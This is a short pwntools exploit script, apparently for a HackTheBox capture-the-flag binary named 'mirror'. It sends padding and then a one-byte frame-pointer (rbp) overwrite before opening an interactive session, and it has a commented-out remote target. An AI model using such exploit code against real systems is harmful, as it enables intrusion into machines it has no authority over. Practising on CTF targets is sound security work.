from pwn import *

p=None
if args.LOCAL:
    p = process('./mirror')
else:
    pass
    #p = remote('docker.hackthebox.eu', 31735)

context.terminal = ['gnome-terminal', '-e']
if args.GDB:
    gdb.attach(p)

# 0x555555555317
# 0x555555555206

p.recvuntil('?')
p.send('y' + "A"*(0x1f-1))
p.recvuntil('mirror.')

#p.send('A'*0x21)
#p.send(cyclic(0x21))

# rbp overwrite by the last byte
p.send("\x00" * 0x20 + "\x10")

p.interactive()
